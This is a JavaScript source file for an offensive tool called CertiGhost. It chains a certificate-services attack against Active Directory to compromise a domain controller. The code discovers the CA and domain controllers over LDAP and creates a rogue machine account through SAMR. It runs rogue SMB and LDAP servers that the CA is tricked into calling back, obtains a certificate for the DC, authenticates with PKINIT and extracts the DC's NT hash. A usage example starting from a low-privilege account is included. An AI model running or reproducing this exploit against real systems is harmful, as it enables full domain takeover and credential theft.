// CertiGhost (CVE-2026-54121) — cdc-redirect chain: request a certificate for
// a target DC by abusing rogue SMB/LDAP servers that return the target's identity
// to the CA during the cdc (CertificateDomainController) chase.
//
// Flow: discover infra → create computer → start rogue servers → request cert
// (CA calls back to rogue servers) → PKINIT with DC cert → extract NT hash.

import { LdapBhClient } from './certify/ldap/source.js';
import { buildCsr, pem } from './certify/adcs/pkcs10.js';
import { extractLeafCert } from './certify/adcs/icpr.js';
import { getTgtPkinit } from './certify/kerberos/pkinit.js';
import { unpacHash } from './certify/kerberos/unpac.js';
import { KdcSocketTransport } from './certify/kerberos/client.js';
import { Smb2Client } from './certify/smb/smb2.js';
import { DceRpc } from './certify/smb/dcerpc.js';
import { NdrReader, ndrUniqueWString as ndrWStr } from './certify/smb/ndr.js';
import { concat } from './certify/ldap/ber.js';
import { md4 } from './certify/crypto/md4.js';
import { RogueSmbServer } from './rogue-smb.js';
import { RogueLdapServer } from './rogue-ldap.js';

const SAMR_UUID = '12345778-1234-abcd-ef00-0123456789ac';
const u16 = (n) => { const b = new Uint8Array(2); new DataView(b.buffer).setUint16(0, n, true); return b; };
const u32 = (n) => { const b = new Uint8Array(4); new DataView(b.buffer).setUint32(0, n >>> 0, true); return b; };
const hex = (b) => Array.from(b, x => x.toString(16).padStart(2, '0')).join('');
const utf16le = (s) => { const b = new Uint8Array(s.length * 2); for (let i = 0; i < s.length; i++) { b[i * 2] = s.charCodeAt(i) & 0xff; b[i * 2 + 1] = s.charCodeAt(i) >> 8; } return b; };
const utf16leZ = (s) => { const b = new Uint8Array(s.length * 2 + 2); for (let i = 0; i < s.length; i++) { b[i * 2] = s.charCodeAt(i) & 0xff; b[i * 2 + 1] = s.charCodeAt(i) >> 8; } return b; };

const ndrUniqueWString = ndrWStr;

// RPC_UNICODE_STRING for SAMR: header { Length(2), MaxLength(2), Buffer_ptr(4) } + deferred { MaxCount(4), Offset(4), ActualCount(4), chars[], pad }
let _samrRef = 0x20000;
function rpcUnicodeStr(s) {
  const u = utf16le(s);
  const chars = s.length;
  const ref = _samrRef; _samrRef += 4;
  const pad = (4 - ((chars * 2) % 4)) % 4;
  return {
    hdr: concat([u16(chars * 2), u16(chars * 2), u32(ref)]),
    def: concat([u32(chars), u32(0), u32(chars), u, new Uint8Array(pad)]),
  };
}

function sidToString(raw) {
  const rev = raw[0], n = raw[1];
  let auth = 0;
  for (let i = 2; i < 8; i++) auth = auth * 256 + raw[i];
  const dv = new DataView(raw.buffer, raw.byteOffset, raw.byteLength);
  const parts = [`S-${rev}-${auth}`];
  for (let i = 0; i < n; i++) parts.push(dv.getUint32(8 + i * 4, true));
  return parts.join('-');
}

function ntHash(password) {
  return md4(utf16le(password));
}

// ---- SAMR computer creation (minimal, inline) -------------------------------
async function createComputerSamr(host, creds, compName, compPass, log) {
  _samrRef = 0x20000;
  const c = new Smb2Client(host, 445, () => {});
  await c.connect();
  await c.negotiate();
  await c.login(creds);
  const tid = await c.treeConnect('IPC$');
  const fid = await c.createPipe(tid, 'samr');
  const tx = (b) => c.transceive(tid, fid, b);
  const wr = (b) => c.writePipe(tid, fid, b);
  const rpc = new DceRpc(tx, { writeOnly: wr });
  await rpc.bind(SAMR_UUID, '1.0');

  const samrStatus = (out) => new DataView(out.buffer, out.byteOffset, out.byteLength).getUint32(out.length - 4, true);

  // SamrConnect2 (opnum 57)
  const MAX = 0x02000000;
  const c2r = await rpc.call(57, concat([ndrUniqueWString(`\\\\${host}`), u32(MAX)]));
  if (samrStatus(c2r)) throw new Error(`SamrConnect2: 0x${samrStatus(c2r).toString(16)}`);
  const serverHandle = c2r.slice(0, 20);

  const domainName = creds.domain.split('.')[0].toUpperCase();

  // SamrLookupDomainInSamServer (opnum 5)
  const dn5 = rpcUnicodeStr(domainName);
  const ldr = await rpc.call(5, concat([serverHandle, dn5.hdr, dn5.def]));
  const ldv = new DataView(ldr.buffer, ldr.byteOffset, ldr.byteLength);
  if (!ldv.getUint32(0, true)) throw new Error('SamrLookupDomain: no SID returned');
  const subAuthCount = ldv.getUint32(4, true);
  const sidBody = ldr.subarray(8, 8 + 8 + subAuthCount * 4);
  const status5 = ldv.getUint32(8 + 8 + subAuthCount * 4, true);
  if (status5) throw new Error(`SamrLookupDomain: 0x${status5.toString(16)}`);

  // SamrOpenDomain (opnum 7)
  const odr = await rpc.call(7, concat([serverHandle, u32(MAX), u32(subAuthCount), sidBody]));
  if (samrStatus(odr)) throw new Error(`SamrOpenDomain: 0x${samrStatus(odr).toString(16)}`);
  const domHandle = odr.slice(0, 20);

  // SamrCreateUser2InDomain (opnum 50)
  const cname = rpcUnicodeStr(compName);
  const createStub = concat([
    domHandle,
    cname.hdr,
    u32(0x00000080),  // USER_WORKSTATION_TRUST_ACCOUNT
    u32(0x000f07ff),  // DesiredAccess
    cname.def,
  ]);
  let createResp;
  try {
    createResp = await rpc.call(50, createStub);
  } catch (e) {
    throw new Error(`SamrCreateUser2InDomain: ${e.message}`);
  }
  const createStatus = samrStatus(createResp);
  if (createStatus) throw new Error(`SamrCreateUser2InDomain: 0x${createStatus.toString(16)}`);
  const userHandle = createResp.slice(0, 20);
  const cdv = new DataView(createResp.buffer, createResp.byteOffset, createResp.byteLength);
  const userRid = cdv.getUint32(24, true);

  // Set password: SamrSetInformationUser (opnum 37) level 18 (UserInternal1Information)
  const pwHash = ntHash(compPass);
  const lmHash = new Uint8Array(16);
  const setStub = concat([
    userHandle,
    u16(18), u16(0),
    pwHash,
    lmHash,
    Uint8Array.of(1),    // NtPasswordPresent
    Uint8Array.of(0),    // LmPasswordPresent
    Uint8Array.of(0),    // PasswordExpired
    new Uint8Array(1),   // padding
  ]);
  try {
    await rpc.call(37, setStub);
  } catch (e) {
    log(`Warning: password set failed (${e.message}), hash may not match`);
  }

  // Set UAC to WORKSTATION_TRUST_ACCOUNT
  try {
    await rpc.call(37, concat([userHandle, u16(16), u16(0), u32(0x1000)]));
  } catch {}

  await rpc.call(1, userHandle);
  await rpc.call(1, domHandle);
  await rpc.call(1, serverHandle);
  await c.closeFile(tid, fid);
  await c.close();
  log(`Created computer: ${compName} (RID ${userRid})`);
}



async function collect(gen) { const a = []; for await (const e of gen) a.push(e); return a; }

// ---- LDAP discovery ---------------------------------------------------------
async function discoverInfra(host, domain, user, password, log) {
  const client = new LdapBhClient(log);
  const dn = domain.split('.').map(p => `DC=${p}`).join(',');
  await client.connect(host, 389, {
    authMethod: 'ntlm', user, domain, password, tls: false,
  });

  try {
    const configNC = `CN=Configuration,${dn}`;
    let caName = null, caHost = null, caIp = null;
    const cas = await collect(client.query({
      baseDN: `CN=Enrollment Services,CN=Public Key Services,CN=Services,${configNC}`,
      filter: '(objectClass=pKIEnrollmentService)',
      attributes: ['cn', 'dNSHostName'],
    }));
    if (cas.length) {
      caName = readAttr(cas[0], 'cn');
      caHost = readAttr(cas[0], 'dNSHostName');
    }

    const dcs = await collect(client.query({
      baseDN: dn,
      filter: '(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))',
      attributes: ['sAMAccountName', 'dNSHostName', 'objectSid'],
    }));
    let targetSAM = null, targetDNS = null, targetSidBin = null;
    if (dcs.length) {
      targetSAM = readAttr(dcs[0], 'sAMAccountName');
      targetDNS = readAttr(dcs[0], 'dNSHostName');
      targetSidBin = readBinAttr(dcs[0], 'objectSid');
    }

    const rootDSE = await collect(client.query({
      baseDN: dn,
      filter: '(objectClass=*)',
      attributes: ['objectSid', 'objectGUID'],
    }));
    let domainSid = null, domainGuid = null;
    if (rootDSE.length) {
      const sidBin = readBinAttr(rootDSE[0], 'objectSid');
      domainSid = sidBin ? sidToString(sidBin) : null;
      domainGuid = readBinAttr(rootDSE[0], 'objectGUID');
    }

    return { caName, caHost, caIp, targetSAM, targetDNS, targetSidBin, domainSid, domainGuid, dn };
  } finally {
    await client.close();
  }
}

function readAttr(entry, name) {
  const attrs = entry.attributes || entry;
  for (const a of (attrs instanceof Map ? [...attrs.entries()] : Object.entries(attrs))) {
    if (a[0].toLowerCase() === name.toLowerCase()) {
      const v = Array.isArray(a[1]) ? a[1][0] : a[1];
      return typeof v === 'string' ? v : new TextDecoder().decode(v);
    }
  }
  return null;
}

function readBinAttr(entry, name) {
  const attrs = entry.attributes || entry;
  for (const a of (attrs instanceof Map ? [...attrs.entries()] : Object.entries(attrs))) {
    if (a[0].toLowerCase() === name.toLowerCase()) {
      const v = Array.isArray(a[1]) ? a[1][0] : a[1];
      if (v instanceof Uint8Array) return v;
      if (typeof v === 'string') {
        try {
          const bin = atob(v);
          const arr = new Uint8Array(bin.length);
          for (let i = 0; i < bin.length; i++) arr[i] = bin.charCodeAt(i);
          return arr;
        } catch { return null; }
      }
      return null;
    }
  }
  return null;
}

// ---- Modified ICPR for certighost -------------------------------------------
async function requestCertGhost(caIp, creds, { caName, template, attackerIp, targetDNS, log }) {
  const { csr, pkcs8 } = await buildCsr({
    subject: `CN=${creds.user.replace(/\$$/, '')}.${creds.domain}`,
    dnsNames: [targetDNS],
  });
  log(`Built CSR with SAN dNSName=${targetDNS}`);

  const c = new Smb2Client(caIp, 445, () => {});
  try {
    await c.connect(); await c.negotiate(); await c.login(creds);
    const tid = await c.treeConnect('IPC$');
    const fid = await c.createPipe(tid, 'cert');
    const tx = (b) => c.transceive(tid, fid, b);
    const wr = (b) => c.writePipe(tid, fid, b);
    const rpc = new DceRpc(tx, { writeOnly: wr });
    const ICPR_UUID = '91ae6020-9e3c-11cf-8d7c-00aa00c091be';
    await rpc.bind(ICPR_UUID, '0.0', { user: creds.user, domain: creds.domain, password: creds.password, level: 6 });
    log(`ICPR bound; requesting ${template} from ${caName} (cdc=${attackerIp}, rmd=${targetDNS})`);

    const attrs = [
      `CertificateTemplate:${template}`,
      `SAN:dns=${targetDNS}`,
      `cdc:${attackerIp}`,
      `rmd:${targetDNS}`,
    ].join('\n');
    const attribs = utf16leZ(attrs);

    const stub = concat([
      u32(0),
      ndrUniqueWString(caName),
      u32(0),
      certTransBlob(attribs, 0x00030000),
      certTransBlob(csr, 0x00040000),
    ]);
    const out = await rpc.call(0, stub);

    const r = new NdrReader(out);
    const requestId = r.u32();
    const disposition = r.u32();
    const readBlob = () => {
      const cb = r.u32(); const ref = r.u32();
      if (!ref) return new Uint8Array(0);
      r.u32(); const b = Uint8Array.from(r.bytes(cb)); r.align(4);
      return b;
    };
    const cert = readBlob();
    readBlob();
    const dispMsgRaw = readBlob();
    let dispMsg = '';
    for (let i = 0; i + 1 < dispMsgRaw.length; i += 2) {
      const ch = dispMsgRaw[i] | (dispMsgRaw[i + 1] << 8);
      if (ch) dispMsg += String.fromCharCode(ch);
    }

    await c.closeFile(tid, fid); await c.close();

    const DISP = { 0: 'incomplete', 1: 'error', 2: 'denied', 3: 'issued', 4: 'issued-oob', 5: 'under-submission', 6: 'revoked' };
    return { requestId, disposition, dispositionText: DISP[disposition] || `0x${(disposition >>> 0).toString(16)}`, message: dispMsg, cert, pkcs8 };
  } catch (e) {
    try { await c.close(); } catch {}
    throw e;
  }
}

function certTransBlob(bytes, ref) {
  if (!bytes || !bytes.length) return concat([u32(0), u32(0)]);
  const pad = (4 - (bytes.length % 4)) % 4;
  return concat([u32(bytes.length), u32(ref), u32(bytes.length), bytes, new Uint8Array(pad)]);
}

// ---- Main entry point -------------------------------------------------------
export async function run(config, hooks = {}) {
  const log = hooks.log || (() => {});
  const { domain, user, password, dcIp, caIp: argCaIp, ca: argCaName,
    listener, targetSan, template = 'Machine',
    computerName: argCompName, computerPass: argCompPass, computerHash: argCompHash } = config;

  const domainNB = domain.split('.')[0].toUpperCase();
  const dn = domain.split('.').map(p => `DC=${p}`).join(',');

  log('Connecting to LDAP …');
  let caName = argCaName, caIp = argCaIp, targetName = targetSan;
  let targetDNS, targetSidBin, targetSid, domainSid, domainGuid;

  try {
    const info = await discoverInfra(dcIp, domain, user, password, log);
    if (!caName && info.caName) caName = info.caName;
    if (!caIp && info.caHost) caIp = info.caHost;
    if (!targetName && info.targetSAM) targetName = info.targetSAM;
    targetDNS = info.targetDNS;
    targetSidBin = info.targetSidBin;
    domainSid = info.domainSid;
    domainGuid = info.domainGuid || new Uint8Array(16);
  } catch (e) {
    log(`LDAP discovery failed: ${e.message}`);
    if (!caName || !targetName) throw new Error('Cannot proceed without CA name and target. Use --ca and --target-san.');
  }

  if (!caName) throw new Error('Cannot detect CA name (use --ca)');
  if (!caIp) caIp = dcIp;
  if (!targetName) throw new Error('Cannot detect target DC (use --target-san)');
  if (!targetName.endsWith('$')) targetName += '$';
  if (!targetDNS) targetDNS = `${targetName.replace(/\$$/, '')}.${domain}`;
  if (targetSidBin) targetSid = sidToString(targetSidBin);

  const attackerIp = listener || dcIp;
  log(`DC: ${dcIp} | CA: ${caName} (${caIp})`);
  log(`Target: ${targetName} (${targetDNS}) | SID: ${targetSid || 'unknown'}`);
  log(`Listener: ${attackerIp}`);

  let compName, compPass, compHash;
  if (argCompName && (argCompHash || argCompPass)) {
    compName = argCompName.endsWith('$') ? argCompName : argCompName + '$';
    compPass = argCompPass || '';
    compHash = argCompHash || hex(ntHash(compPass));
    log(`Using existing computer: ${compName}`);
  } else {
    const rnd = Array.from(globalThis.crypto.getRandomValues(new Uint8Array(4)), b => b.toString(36)).join('').substring(0, 8).toUpperCase();
    compName = `GHOST${rnd}$`;
    compPass = 'CG' + hex(globalThis.crypto.getRandomValues(new Uint8Array(5))) + 'Aa1';
    log(`Creating computer: ${compName}`);
    try {
      await createComputerSamr(dcIp, { user, domain, password }, compName, compPass, log);
    } catch (e) {
      throw new Error(`Computer creation failed: ${e.message}. Use --computer-name and --computer-hash for an existing account.`);
    }
    compHash = hex(ntHash(compPass));
  }

  log('Starting rogue servers (SMB:445 + LDAP:389) …');
  const targetCN = targetName.replace(/\$$/, '');

  const smbSrv = new RogueSmbServer({
    dcIp, domain, domainNB, compName, compHash, log,
    targetNB: domainNB,
    targetDNS: domain,
    targetForest: domain,
    targetGuid: domainGuid instanceof Uint8Array ? domainGuid : new Uint8Array(16),
    targetSid: domainSid || 'S-1-5-21-0-0-0',
  });

  const ldapSrv = new RogueLdapServer({
    dcIp, domain, domainNB, compName, compHash, log,
    targetDNS,
    targetCN,
    targetSAM: targetName,
    targetSidBin: targetSidBin || new Uint8Array(28),
  });

  try {
    await smbSrv.start('0.0.0.0', 445);
    await ldapSrv.start('0.0.0.0', 389);

    await new Promise(r => setTimeout(r, 1000));

    log(`Requesting certificate (template=${template}, cdc=${attackerIp}) …`);
    const creds = { user, domain, password };
    const certResult = await requestCertGhost(caIp, creds, {
      caName, template, attackerIp, targetDNS, log,
    });

    if (certResult.disposition !== 3) {
      throw new Error(`Cert request ${certResult.dispositionText}: ${certResult.message}`);
    }

    log(`Certificate issued (requestId ${certResult.requestId})`);
    const leafDer = extractLeafCert(certResult.cert);
    const certPem = pem('CERTIFICATE', leafDer);
    const keyPem = pem('PRIVATE KEY', certResult.pkcs8);

    log(`PKINIT as ${targetName} …`);
    const privateKey = await globalThis.crypto.subtle.importKey(
      'pkcs8', certResult.pkcs8,
      { name: 'RSASSA-PKCS1-v1_5', hash: 'SHA-256' }, false, ['sign']
    );

    const transport = new KdcSocketTransport(dcIp, 88, log);
    await transport.connect();
    try {
      const tgt = await getTgtPkinit(transport, {
        username: targetName,
        realm: domain.toUpperCase(),
        certDer: leafDer,
        privateKey,
        log,
      });

      const { ntHash: recoveredHash } = await unpacHash(transport, tgt, log);

      log('');
      log(`${targetName}:${recoveredHash}`);
      return {
        ok: true,
        target: targetName,
        domain,
        ntHash: recoveredHash,
        certPem,
        keyPem,
      };
    } finally {
      await transport.close();
    }
  } finally {
    await smbSrv.stop();
    await ldapSrv.stop();
  }
}

export const USAGE = 'certighost -d <domain> -u <user> -p <pass> -H <dc-ip> [--ca <ca>] [--ca-ip <ip>] [--listener <ip>] [--target-san <account$>] [--template Machine]';
export const EXAMPLE = 'certighost -d corp.local -u lowpriv -p Password1 -H 192.168.1.10 --listener 192.168.1.50';
